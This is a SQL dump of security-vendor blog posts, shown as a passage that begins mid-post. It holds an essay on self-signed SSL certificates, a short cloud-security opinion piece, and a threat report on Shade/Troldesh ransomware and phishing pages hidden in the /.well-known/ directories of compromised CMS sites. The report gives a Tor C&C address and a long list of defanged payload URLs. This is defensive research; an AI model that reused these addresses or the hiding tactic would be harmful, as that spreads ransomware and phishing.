then what value is the encryption really providing? How do you tell a complete stranger a secret in private and still expect the secret to remain safe from strangers?\r\n\r\nLet’s look at how SSL tackles authentication via the use of certificates. A signed (i.e. authenticated) certificate is essentially a digital record that says “My name is Bob, and this big trusted company over here agrees with that statement.” The idea is that browsers trust a set of big trusted companies (Certificate Authorities such as VeriSign, Thawte, etc.), and that creates a trust chain: we trust the browser, the browser trusts the CA, the CA says this is Bob, so we trust it is Bob. On the other hand, a self-signed (i.e. non-authenticated) certificate is a digital record that says “My name is Bob, and you will just have to trust me that what I am saying is true.” It’s almost like the honor-system approach of everyone stating who they are; but how do we know if they are lying? Essentially, you don’t…because self-signed certificates can be created by anyone to say anything (that is the whole purpose of self-signed certificates). An evil attacker can trivially generate certificates that say “My name is Paypal, and you will just have to trust me,” “My name is eBay, and you will just have to trust me,” “My name is Bank of America, and you will just have to trust me,” etc. The only thing that prevents the attacker from deceiving you with these malicious self-signed certificates is your browser’s better judgment of not trusting these arbitrarily fabricated declarations of identity having no proof. Remember: security is about keeping you safe despite lies and deception; we need to ensure that a simple lie by an attacker won’t compromise the entire process. In this case, self-signed certificates offer a way for attackers to lie about their identity with impunity.\r\n\r\nSo let’s go back to the original premise of the question and look a bit more technically at what’s going on. The argument is the desire to have encryption without authentication. That means the sensitivity and secrecy of the data is still an issue/desire, otherwise, why bother with encryption? The primary threat vector mitigated by end-to-end encryption on a network is passive eavesdropping (a.k.a. network sniffing). But keep in mind that, in SSL, the encryption keys are dynamically negotiated by the two endpoints at the start of the connection (after authentication has concluded). Thus encryption by itself offers no security value if the passive eavesdropping attacker decides to switch to an active man-in-the-middle or interception attack (which is technically viable if they were already in a position to eavesdrop your network traffic to begin with); this just means you are now negotiating an encryption key with the attacker and directly sending them your data. SSL normally mitigates these attacks by the use of authentication, to ensure the endpoint you negotiate your encryption key with is indeed who they say they are. However if we allow self-signed certificates to be used and therefore overlook the authentication aspect, there is zero guarantee that the person you just negotiated an encryption tunnel with isn’t the person you were trying to secure your information from (via encryption) in the first place. True, it does require the attacker to switch from a passive attack to an active attack, but that is of little consequence if the attacker truly wants to compromise the data. And attackers are already playing very active roles in attacks today (setting up an entire phishing site and sending out phishing emails isn’t exactly a passive affair…).\r\n\r\nI have a hunch the real motive behind petitioning for self-signed certificate support is purely economic. Web site operators want to appear to conform to user expectations of security and privacy via the use of SSL (the whole “make sure the little lock icon appears in your browser before you send sensitive info” mantra), but without having to shell out cash for a real SSL certificate (if they just paid the money for a proper CA-signed certificate, this whole debate is moot). It’s the façade of security without actually delivering on the promise. But those that are using self-signed SSL certificates for production uses, even prior to the newer crop of browsers handling them less favorably, are already doing a slight injustice to security as whole—because they are forcing a user to essentially make a “Yes I know this is insecure, please proceed anyways” decision. Accepting self-signed certificates in older browsers is usually just a semi-scary dialogue followed by a one-click override from the user….and apparently the protagonists of this debate believe this (was) acceptable for users to do. But isn’t that just exacerbating the phenomenon of users continually making bad security choices, by explicitly encouraging them to do so? We should not be encouraging users to bypass or override security protection mechanisms put there for their own good; what starts as an encouraged exception may eventually become an assumed norm (I’d like to make a Pavlov reference here, but I don’t want it seen as belittling the behavior or intelligence of users).\r\n\r\nAll of that said, I suppose there are some certain approaches that may offer a balanced compromise. If we look at SSH, we encounter the same basic problem: when the client first connects to the server, it doesn’t know if the server is actually the right server or not. So usually the client prompts the user with a small fingerprint of the server’s identity in order to verify that identity out-of-band. If the user instructs the client to proceed, the client caches the server’s identity fingerprint. From that point on, as long as the server’s identity fingerprint matches what is cached, life is good. If that identity fingerprint ever changes, then lots of security bells and whistles go off because something is afoot, such as a man-in-the-middle attack (or the server admin re-generated their identity information, which is not something done arbitrarily). Basically it reduces the “no-authentication” scenario down to only the very first, initial connection that the client makes to the server. An attacker would have one chance—and one chance only—to intercept that very first connection and supply impersonated credentials. But also keep in mind, if the attacker stops the interception ruse and allows the connections to proceed to the proper server, the client will immediately alert the user to something fishy because the server identity (as seen by the client) has changed. So an attacker can remain undetected if and only if they intercept that very first connection, and only for as long as they actively and continually intercept all future connections. That reduces the chance of successful attack to a very small window, and requires moderate effort on part of the attacker to remain undetected. Perhaps this approach could be adapted to browsers, where a self-signed certificate for a given site can be manually verified once (the first time), and then cached so that as long as the certificate doesn’t change, it can be assumed to be the same site. It is entirely a change to the client browser and how SSL certificates are validated; no SSL protocol or server-side changes are necessary.\r\n\r\nBut unless browsers were to enact such a change, the use of self-signed certificates in this day in age is a risky proposition. They are fine for testing purposes, but they should never be used in production with real users. An alternate approach to using self-signed certificates is to create your own CA (you can use the free OpenSSL suite to do so) and use your CA to sign your server certificates; then encourage your users to install your CA certificate. This at least maintains the integrity and security value of the SSL protocol, and would allow the users\' browsers to function without any security warnings requiring user interaction. However, you must then guard your CA private keys thoroughly, as you have now because a trusted entity in the browser’s eyes; if your CA keys are stolen, it would allow attackers to generate arbitrary certificates that are signed by your CA. In other words, the attacker could create the equivalent of arbitrary self-signed certificates but would actually use you as the trusted signing authority, and since the users’ browsers now trust your CA, the browsers would inherently trust all of the attacker’s certificates.\r\n\r\nRegardless of what you do, one thing is for certain: you do not want to be the weakest link in the security chain. SSL literally has a trust chain established by the use of authentication certificates, and trying to bypass authentication (and the associated trust chain) compromises all security (including encryption) offered by SSL. No one likes being identified as the weakest link, so save your company the PR trouble and just buy that SSL certificate from a proper CA. It’s what is best for everyone involved, and your wallet will recover.\r\n\r\n- Jeff', 'Encryption', 'https://www.zscaler.com/blogs/research/ssl-encryption-without-authentication-debate');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (621, 'Cloud Cover', 'Michael Sutton', 'September 26, 2008', 'The term \'cloud computing\' is quickly becoming a standard part of our vernacular but do security services have a place in the cloud? We have seen a handful of fundamental shifts in computing over the decades and I firmly believe that cloud computing represents a major evolution in information technology and that the evolution has only just begun. For proof of this, Google the term \'cloud computing\' and see just how many news hits result. As I write this, the number is north of 4,000 and a quick scan of the headlines is like a drive through Silicon Valley - the usual suspects are everywhere. Sounds like a quick, steep climb up the hype cycle to me. The question for me is not will cloud computing stick around, but rather how quickly will it be adopted and more specifically, how must security services adapt to accommodate this paradigm shift?    Some industries have quickly adopted cloud computing while others have moved more cautiously. Google is of course a pioneer in the space, having invested heavily in the belief that the day will come when storing data in the cloud will be the de facto standard. So far their gamble seems to be paying off. Gmail (despite eternal beta status) has gone from being an interesting Hotmail competitor, to the email infrastructure leveraged by enterprises, big and small. Even Google Docs shows promise. I\'ve gone from being a skeptic to appreciating the collaborative power of hosting apps online, especially in a world where employees are commonly separated by geography.    Privacy concerns present a challenge that must be overcome for cloud computing to enjoy broad adoption and rapid growth. That barrier is however coming down quickly. There was a time when companies wouldn\'t have considered housing sensitive sales data anywhere other than on the corporate LAN and today Salesforce is one of the true success stories of the cloud computing era. Reliability is the second critical challenge which must be tackled and when major players such as Google or Amazon have outages, no matter how brief, it makes headlines. This challenge however, will be solved too. When customers demand reliability and money is on the line, there is no shortage of incentive to solve such problems and solve them quickly.    So where does this leave security services? My bias is obvious and I won\'t hide it. I believe that security services are destined to shift from products to services. Security is a necessary evil. Banks don\'t hire hoards of security experts because they want to, they do so because they have to. If a reliable service were in place, which could provide an equivalent or better level of security at a lower TCO, would enterprises adopt it? I think so. While to date few such services have existed, the acceptance and adoption of cloud computing in other industries will continue to facilitate the adoption of security services in the cloud as well. The challenges will be similar for the security industry - privacy and reliability, with special emphasis on the former. The challenge is real and it has arrived. It\'s now up to us to solve it.    - michael', 'Cloud', 'https://www.zscaler.com/blogs/research/cloud-cover');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (622, 'Abuse of hidden “well-known” directory in HTTPS sites', 'Mohd Sadique', 'March 26, 2019', 'WordPress and Joomla are among the most popular Content Management Systems (CMSs). They have also become popular for malicious actors, as cybercriminals target sites on these platforms for hacking and injecting malicious content. During the past few weeks, ThreatLabZ researchers have detected several WordPress and Joomla sites that were serving Shade/Troldesh ransomware, backdoors, redirectors, and a variety of phishing pages. The most well-known threats to CMS sites are the result of vulnerabilities introduced by plugins, themes, and extensions.    In this blog, we are focusing on the Shade/Troldesh ransomware and phishing pages that we detected last month from several hundred compromised CMS sites. Shade ransomware has been quite active in the wild and we have been seeing a number of compromised WordPress and Joomla sites being used to spread the ransomware.    The compromised WordPress sites we have seen are using versions 4.8.9 to 5.1.1 and they use SSL certificates issued by Automatic Certificate Management Environment (ACME)-driven certificate authorities, such as Let’s Encrypt, GlobalSign, cPanel, and DigiCert, among others. These compromised WordPress sites may have outdated CMS plugins/themes or server-side software which potentially could also be the reason for the compromise.        Fig 1: Hits of Shade and phishing in detected CMS sites    During the past month, our cloud blocked transactions for compromised WordPress and Joomla due to Shade ransomware payloads (13.6 percent) and phishing pages (27.6 percent), with the remaining blocks due to coinminers, adware, and malicious redirectors.    We have been monitoring the compromised HTTPS sites for a few weeks and have noticed that attackers are favoring a well-known hidden directory present on the HTTPS website for storing and distributing Shade ransomware and phishing pages.    The hidden /.well-known/ directory in a website is a URI prefix for well-known locations defined by IETF and commonly used to demonstrate ownership of a domain. The administrators of HTTPS websites that use ACME to manage SSL certificates place a unique token inside the /.well-known/acme-challenge/ or /.well-known/pki-validation/ directories to show the certificate authority (CA) that they control the domain. The CA will send them specific code for an HTML page that must be located in this particular directory. The CA will then scan for this code to validate the domain.    The attackers use these locations to hide malware and phishing pages from the administrators. The tactic is effective because this directory is already present on most HTTPS sites and is hidden, which increases the life of the malicious/phishing content on the compromised site.    The different types of threats that we found under the hidden directory in the past month are shown in the below image.        Fig 2: Threats in hidden directory        Fig 3: Shade ransomware vs. phishing pages in the hidden directory         Case I: Shade/Troldesh ransomware under the hidden directory       The graph below shows the Shade/Troldesh ransomware under the hidden directory that we detected last month.        Fig 4: Shade/Troldesh ransomware hits over one month    In the case of Shade/Troldesh ransomware, every compromised site has three types of files: HTML, ZIP, and EXE (.jpg), as shown below.        Fig 5: Shade in hidden SSL validation directory    inst.htm and thn.htm are HTML files that redirect to download ZIP files.  reso.zip, rolf.zip, and stroi-invest.zip are ZIP files that contain the JavaScript file.  msg.jpg and msges.jpg are EXE files that are the Shade ransomware.        Fig 6: Shade Infection chain    Troldesh is typically spread by malspam with a ZIP attachment or a link to an HTML redirector page, which downloads the ZIP file. The malspam pretends to be an order update coming from a Russian organization. An example of an email that has the link of the HTML redirector is shown below.        Fig: 7 Malspam mail           Fig 8: Redirector to download ZIP    The ZIP file contains only the JavaScript file with a Russian name. The JavaScript is highly obfuscated and encrypted strings are decrypted at runtime by the below function.        Fig 9: Decryption function    After decryption, the JavaScript has the functionalities shown below. It tries to connect one of the two URLs, downloads the payload in %TEMP%, and executes it.        Fig 10: Simplified JavaScript code    The downloaded payload is the new variant of Shade/Troldesh ransomware, which has been around since 2014. It has two layers of packers: custom and UPX. After unpacking, it saves its configurations in “HKEY_LOCAL_MACHINE\\SOFTWARE\\System32\\Configuration”.        Fig 11: Shade configuration    xcnt = Count of encrypted files  xi = ID of infected machine  xpk = RSA public key for encryption  xVersion = Version of current Shade ransomware    The command-and-control (C&C) server is a4ad4ip2xzclh6fd[.]onion. It drops a TOR client in %TEMP% to connect to its C&C server. For each file, the file content and file name are encrypted with AES-256 in CBC mode with two different keys. After encryption, it changes the filename to BASE64(AES(file_name)).ID_of_infected_machine.crypted000007.        Fig 12: Encrypted files    It drops a copy of itself in %ProgramData%\\Windows\\csrss.exe and makes a run entry for this copy with the name “BurnAware.” It drops README1.txt to README10.txt on the desktop and changes the wallpaper as shown below.        Fig 13: Shade wallpaper    README.txt has ransom note in both Russian and English languages.        Fig 14: Shade ransom note        Fig 15: Zscaler sandbox report for Shade/Troldesh ransomware         Case II: Phishing pages under the hidden directory      The graph below shows the different types of phishing pages under the hidden directory that we detected last month.        Fig 16: Phishing hits over one month    The phishing pages we have seen up to this point, which are hosted under SSL-validated hidden directories, are related to Office 365, Microsoft, DHL, Dropbox, Bank of America, Yahoo, Gmail, and others.        Fig 17: OneDrive phishing page        Fig 18: Yahoo phishing page        Fig 19: DHL phishing page         IOCs:    aioshipping[.]com/.well-known/acme-challenge/msg.jpg  yourcurrencyrates[.]com/.well-known/pki-validation/mxr.pdf  rangtrangxinh[.]vn/.well-known/acme-challenge/msg.jpg  judge[.]education/.well-known/pki-validation/ssj.jpg  hoadaklak[.]com/.well-known/acme-challenge/ssj.jpg  nguyenlinh[.]vn/.well-known/acme-challenge/msg.jpg  rdsis[.]in/.well-known/pki-validation/msg.jpg  khanlanhdaklak[.]com/.well-known/acme-challenge/ssj.jpg  presse[.]schmutzki.de:80/.well-known/acme-challenge/messg.jpg  aioshipping[.]com:80/.well-known/acme-challenge/msg.jpg  yourcurrencyrates[.]com:80/.well-known/pki-validation/mxr.pdf  vinhomeshalongxanh[.]xyz:80/.well-known/pki-validation/ssj.jpg  titusrealestate[.]com.fj:80/.well-known/pki-validation/msg.jpg  dichvucong[.]vn:80/.well-known/acme-challenge/msg.jpg  myphamnarguerite[.]com:80/.well-known/acme-challenge/mxr.pdf  minifyurl[.]net:80/.well-known/pki-validation/mxr.pdf  judge[.]education:80/.well-known/pki-validation/ssj.jpg  minifyurl[.]net/.well-known/pki-validation/mxr.pdf  neccotweethearts[.]com:80/.well-known/pki-validation/mxr.pdf  backuptest[.]tomward.org.uk:80/.well-known/pki-validation/ssj.jpg  mobshop[.]schmutzki.de:80/.well-known/acme-challenge/messg.jpg  neccotweethearts[.]com/.well-known/pki-validation/mxr.pdf  myphamnarguerite[.]com/.well-known/acme-challenge/mxr.pdf  khanlanhdaklak[.]com:80/.well-known/acme-challenge/ssj.jpg  presse[.]schmutzki.de/.well-known/acme-challenge/messg.jpg  mobshop[.]schmutzki.de/.well-known/acme-challenge/messg.jpg  globalkabar[.]com/.well-known/pki-validation/sserv.jpg  ereservices[.]com:80/.well-known/pki-validation/ssj.jpg  dulichvietlao[.]vn:80/.well-known/acme-challenge/ssj.jpg  backuptest[.]tomward.org.uk/.well-known/pki-validation/ssj.jpg  mamycloth[.]store:80/.well-known/acme-challenge/msg.jpg  business[.]driverclub.co:80/.well-known/pki-validation/msg.jpg  vinhomeshalongxanh[.]xyz/.well-known/pki-validation/ssj.jpg  dichvucong[.]vn/.well-known/acme-challenge/msg.jpg  thuducland[.]net/.well-known/acme-challenge/sserv.jpg  sahabathasyim[.]com/.well-known/acme-challenge/sserv.jpg  rangtrangxinh[.]vn:80/.well-known/acme-challenge/msg.jpg  lovecookingshop[.]com:80/.well-known/pki-validation/ssj.jpg  ereservices[.]com/.well-known/pki-validation/ssj.jpg  hoadaklak[.]com:80/.well-known/acme-challenge/ssj.jpg  ceroshop[.]net/.well-known/acme-challenge/nba1.jpg  thuducland[.]net:80/.well-known/acme-challenge/sserv.jpg  lovecookingshop[.]com/.well-known/pki-validation/ssj.jpg  entrenadorpersonalterrassa[.]com.es:80/.well-known/acme-challenge/mxr.pdf  epifaniacr[.]net:80/.well-known/pki-validation/ssj.jpg  titusrealestate[.]com.fj/.well-known/pki-validation/msg.jpg  globalkabar[.]com:80/.well-known/pki-validation/sserv.jpg  sahabathasyim[.]com:80/.well-known/acme-challenge/sserv.jpg  dulichvietlao[.]vn/.well-known/acme-challenge/ssj.jpg  argfoodfest[.]e-zero.com.ar:80/.well-known/pki-validation/ssj.jpg  aa[-]publisher.com:80/.well-known/mxr.pdf  duandojiland[-]sapphire.com:80/.well-known/pki-validation/ssj.jpg  master[-]of-bitcoin.net/.well-known/pki-validation/messg.jpg  ea[-]no7.net/.well-known/pki-validation/messg.jpg  tropictowersfiji[.]com/.well-known/pki-validation/msg.jpg  test[.]digimarkting.com/.well-known/pki-validation/msges.jpg  tebarameatsfiji[.]com/.well-known/pki-validation/msg.jpg  sbs[.]ipeary.com/.well-known/pki-validation/msges.jpg  sbs[.]ipeary.com/.well-known/pki-validation/msg.jpg  samyaksolution[.]co.in/.well-known/pki-validation/msges.jpg  samyaksolution[.]co.in/.well-known/pki-validation/msg.jpg  rosyheartsfiji[.]com/.well-known/pki-validation/pik.zip  needcareers[.]com/.well-known/pki-validation/msges.jpg  natristhub[.]club/.well-known/pki-validation/msges.jpg  natristhub[.]club/.well-known/pki-validation/msg.jpg  mytripland[.]com:80/.well-known/pki-validation/sserv.jpg  learning[.]ipeary.com/.well-known/pki-validation/msg.jpg  ipeari[.]com/.well-known/pki-validation/msg.jpg  diennangmattroi[.]com/.well-known/pki-validation/msges.jpg  diennangmattroi[.]com/.well-known/pki-validation/msg.jpg  alonhadat24h[.]vn/.well-known/acme-challenge/update_2018_02.browser-components.zip  24bizhub[.]com/.well-known/pki-validation/msges.jpg  24bizhub[.]com/.well-known/pki-validation/msg.jpg  thinkmonochrome[.]co.uk/.well-known/acme-challenge/messg.jpg  test[.]digimarkting.com/.well-known/pki-validation/msg.jpg  needcareers[.]com/.well-known/pki-validation/msg.jpg  hanggiadungduc[.]vn/.well-known/acme-challenge/reso.zip  designitpro[.]net/.well-known/acme-challenge/msg.jpg  zanatika[.]com:80/.well-known/acme-challenge/ssj.jpg  vina[.]fun:80/.well-known/acme-challenge/ssj.jpg  nexusdental[.]com.mx/.well-known/acme-challenge/ssj.jpg  neccotweethearts[.]com:80/.well-known/pki-validation/ssj.jpg  jayc[-]productions.com:80/.well-known/acme-challenge/ssj.jpg  indochine[-]mekong.com:80/.well-known/acme-challenge/ssj.jpg  hexamersolution[.]com/.well-known/acme-challenge/msg.jpg  hexacode[.]lk:80/.well-known/acme-challenge/ssj.jpg  dongha[.]city:80/.well-known/acme-challenge/ssj.jpg  domika[.]vn/.well-known/acme-challenge/msg.jpg  coupanadda[.]in:80/.well-known/pki-validation/ssj.jpg  choviahe[.]cf:80/.well-known/acme-challenge/ssj.jpg  brace[-]dd.com/.well-known/pki-validation/msg.jpg  angkaprediksi[.]fun/.well-known/acme-challenge/msg.jpg  advancitinc[.]com/.well-known/pki-validation/msg.jpg  vodai[.]bid/.well-known/pki-validation/ssj.jpg  thucphammena[.]com/.well-known/acme-challenge/ssj.jpg  thefoodgram[.]com/.well-known/acme-challenge/tehnikol.zip  thefoodgram[.]com/.well-known/acme-challenge/stroi-industr.zip  shopkimhuyen[.]com/.well-known/acme-challenge/msg.jpg  shine[.]bmt.city/.well-known/acme-challenge/ssj.jpg  sbs[.]ipeary.com/.well-known/pki-validation/stroi-industr.zip  needcareers[.]com/.well-known/pki-validation/tehnikol.zip  needcareers[.]com/.well-known/pki-validation/stroi-industr.zip  maithanhduong[.]com/.well-known/pki-validation/pik.zip  luongynhiem[.]com/.well-known/pki-validation/gkpik.zip  lichxuansaigon[.]com:80/.well-known/acme-challenge/ssj.jpg  kinder[-]express.de/.well-known/acme-challenge/reso.zip  khannen[.]com.vn/.well-known/acme-challenge/ssj.jpg  jayc[-]productions.com/.well-known/acme-challenge/ssj.jpg  jambanswers[.]org/.well-known/pki-validation/ssj.jpg  intercontinentalglobalservice[.]com:80/.well-known/pki-validation/ssj.jpg  gurusexpo[.]com.ng/.well-known/pki-validation/ssj.jpg  gotrungtuan[.]online/.well-known/acme-challenge/ssj.jpg  goindelivery[.]com/.well-known/pki-validation/major.zip  fernandoherrera[.]me:80/.well-known/acme-challenge/ssj.jpg  diennangmattroi[.]com/.well-known/pki-validation/stroi-industr.zip  canhooceangate[.]com/.well-known/acme-challenge/sserv.jpg  bramptonpharmacy[.]ca/.well-known/acme-challenge/msg.jpg  bolt[-]fast.com/.well-known/pki-validation/gkpik.zip  bmt[.]today/.well-known/acme-challenge/ssj.jpg  blog[.]ponta-fukui.com/.well-known/pki-validation/pik.zip  bhartivaish[.]com:80/.well-known/acme-challenge/ssj.jpg  attireup[.]com/.well-known/acme-challenge/tehnikol.zip  attireup[.]com/.well-known/acme-challenge/stroi-industr.zip  acreationevents[.]com/.well-known/acme-challenge/msg.jpg  yeu82[.]com/.well-known/acme-challenge/ssj.jpg  yeu81[.]com/.well-known/acme-challenge/ssj.jpg  yeu49[.]com/.well-known/acme-challenge/ssj.jpg  yeu48[.]com/.well-known/acme-challenge/ssj.jpg  vuacacao[.]com/.well-known/acme-challenge/ssj.jpg  vision[-]ex.de/.well-known/acme-challenge/reso.zip  vinaykhatri[.]in/.well-known/acme-challenge/ssj.jpg  vinaykhatri[.]in/.well-known/acme-challenge/mxr.pdf  variantmag[.]com/.well-known/acme-challenge/sserv.jpg  valentinesblues[.]com/.well-known/pki-validation/sserv.jpg  uyencometics[.]bmt.city/.well-known/acme-challenge/ssj.jpg  tysonfury[.]rocks/.well-known/acme-challenge/msg.jpg  tulipremodeling[.]com/.well-known/acme-challenge/sserv.jpg  tropictowersfiji[.]com/.well-known/pki-validation/pik.zip  thesaturnring[.]com/.well-known/acme-challenge/mxr.pdf  theotokis[.]gr/.well-known/pki-validation/mxr.pdf  thefashionelan[.]com/.well-known/pki-validation/msg.jpg  tanione[.]com:80/.well-known/acme-challenge/ssj.jpg  tanione[.]com/.well-known/acme-challenge/ssj.jpg  steeveriano[.]com/.well-known/pki-validation/msg.jpg  singleparentaustralia[.]com.au/.well-known/pki-validation/reso.zip  shafercharacter[.]org/.well-known/acme-challenge/messg.jpg  service[.]baynuri.net/.well-known/acme-challenge/messg.jpg  samyaksolution[.]co.in/.well-known/pki-validation/rolf.zip  realman[.]work/.well-known/acme-challenge/reso.zip  rarejewelry[.]net/.well-known/acme-challenge/mxr.pdf  rarejewelry[.]net/.well-known/acme-challenge/messg.jpg  qsongchihotel[.]com/.well-known/acme-challenge/ssj.jpg  panama[.]driverclub.co/.well-known/pki-validation/pic.zip  ngheve[.]com/.well-known/acme-challenge/ssj.jpg  nfc[.]com.vn/.well-known/acme-challenge/msg.jpg  next[-]vision.ro/.well-known/pki-validation/ssj.jpg  newsnaija[.]ng/.well-known/pki-validation/ssj.jpg  newsnaija[.]ng/.well-known/pki-validation/mxr.pdf  neelshivamlaw[.]com/.well-known/pki-validation/pic.inform.zip  neccotweethearts[.]com/.well-known/pki-validation/ssj.jpg  navegacaolacet[.]com.br/.well-known/acme-challenge/msg.jpg  mytripland[.]com/.well-known/pki-validation/ssj.jpg  myschoolmarket[.]com.ng/.well-known/acme-challenge/ssj.jpg  mskhangroup[.]com/.well-known/pki-validation/pic.zip  mskhangroup[.]com/.well-known/pki-validation/msg.jpg  morganbits[.]com/.well-known/acme-challenge/mxr.pdf  mo7o[.]fun:80/.well-known/acme-challenge/mxr.pdf  mitsubishidn[.]com.vn/.well-known/acme-challenge/sserv.jpg  meliscar[.]com:80/.well-known/pki-validation/ssj.jpg  meliscar[.]com/.well-known/pki-validation/ssj.jpg  manhattan[.]dangcaphoanggia.com/.well-known/acme-challenge/mxr.pdf  maithanhduong[.]com/.well-known/pki-validation/msg.jpg  lichxuansaigon[.]com/.well-known/acme-challenge/ssj.jpg  lemon[-]remodeling.com/.well-known/acme-challenge/sserv.jpg  lastra[.]top/.well-known/pki-validation/msg.jpg  laflamme[-]heli.com/.well-known/acme-challenge/ssj.jpg  laflamme[-]heli.com/.well-known/acme-challenge/sserv.jpg  kousen[.]fire-navi.jp/.well-known/pki-validation/msg.jpg  jambanswers[.]org/.well-known/pki-validation/vseros.bank.zakaz.docx.zip  integramultimedia[.]com.mx/.well-known/acme-challenge/ssj.jpg  incgoin[.]com/.well-known/pki-validation/reso.zip  hexacode[.]lk/.well-known/acme-challenge/ssj.jpg  happysungroup[.]de/.well-known/pki-validation/ssj.jpg  goindelivery[.]com/.well-known/pki-validation/reso.zip  goindelivery[.]com/.well-known/pki-validation/msg.jpg  goindelivery[.]com/.well-known/pki-validation/kia.zip  gnb[.]uz/.well-known/pki-validation/ssj.jpg  geecee[.]co.za/.well-known/pki-validation/msg.jpg  geecee[.]co.za/.well-known/pki-validation/kia.zip  gdn[.]segera.live/.well-known/pki-validation/sserv.jpg  fijidirectoryonline[.]com/.well-known/pki-validation/msg.jpg  fastimmo[.]fr/.well-known/acme-challenge/sserv.jpg  ereservices[.]com/.well-known/pki-validation/sserv.jpg  ede[.]coffee/.well-known/acme-challenge/ssj.jpg  dongydaisinhduong[.]com/.well-known/acme-challenge/messg.jpg  diota[-]ar.com:80/.well-known/acme-challenge/mxr.pdf  diota[-]ar.com/.well-known/acme-challenge/mxr.pdf  diamondking[.]co/.well-known/pki-validation/sserv.jpg  dev01[.]europeanexperts.com/.well-known/pki-validation/messg.jpg  designitpro[.]net/.well-known/acme-challenge/reso.zip  damuoigiasi[.]com/.well-known/acme-challenge/ssj.jpg  dailynow[.]vn/.well-known/acme-challenge/msg.jpg  choviahe[.]cf/.well-known/acme-challenge/ssj.jpg  cellulosic[.]logicalatdemo.co.in/.well-known/pki-validation/ssj.jpg  business[.]driverclub.co/.well-known/pki-validation/msg.jpg  bhartivaish[.]com/.well-known/acme-challenge/sserv.jpg  bcspremier[.]ru/promo/well-known/images/background_sm.jpg  bcspremier[.]ru/promo/well-known/images/background_lg.jpg  atiqah[.]my/.well-known/pki-validation/sserv.jpg  aanarehabcenter[.]com:80/.well-known/pki-validation/ssj.jpg  aanarehabcenter[.]com/.well-known/pki-validation/ssj.jpg  24bizhub[.]com/.well-known/pki-validation/tehnikol.zip  24bizhub[.]com/.well-known/pki-validation/stroi-industr.zip  ipeari[.]com/.well-known/pki-validation/msg.jpg  ipeari[.]com/.well-known/pki-validation/reso.zip  ipeari[.]com/.well-known/pki-validation/stroi-industr.zip  ipeari[.]com/.well-known/pki-validation/stroi-invest.zip  ipeari[.]com/.well-known/pki-validation/tehnikol.zip  learning[.]ipeary.com/.well-known/pki-validation/msg.jpg  learning[.]ipeary.com/.well-known/pki-validation/reso.zip  learning[.]ipeary.com/.well-known/pki-validation/stroi-industr.zip  learning[.]ipeary.com/.well-known/pki-validation/stroi-invest.zip  learning[.]ipeary.com/.well-known/pki-validation/tehnikol.zip  test[.]digimarkting.com/.well-known/pki-validation/msg.jpg  test[.]digimarkting.com/.well-known/pki-validation/reso.zip  test[.]digimarkting.com/.well-known/pki-validation/stroi-industr.zip  test[.]digimarkting.com/.well-known/pki-validation/stroi-invest.zip  test[.]digimarkting.com/.well-known/pki-validation/tehnikol.zip  SBS[.]ipeary.com/.well-known/pki-validation/msg.jpg  SBS[.]ipeary.com/.well-known/pki-validation/reso.zip  SBS[.]ipeary.com/.well-known/pki-validation/stroi-industr.zip  SBS[.]ipeary.com/.well-known/pki-validation/stroi-invest.zip  SBS[.]ipeary.com/.well-known/pki-validation/tehnikol.zip  singleparentaustralia[.]com.au/.well-known/pki-validation/msg.jpg  singleparentaustralia[.]com.au/.well-known/pki-validation/reso.zip  natristhub[.]club/.well-known/pki-validation/msg.jpg  natristhub[.]club/.well-known/pki-validation/reso.zip  natristhub[.]club/.well-known/pki-validation/stroi-industr.zip  natristhub[.]club/.well-known/pki-validation/stroi-invest.zip  natristhub[.]club/.well-known/pki-validation/tehnikol.zip  natristhub[.]club/.well-known/pki-validation/tehnikol1.zip', 'Analysis;Compromise;Malware;Phishing;Ransomware', 'https://www.zscaler.com/blogs/research/abuse-hidden-well-known-directory-https-sites');
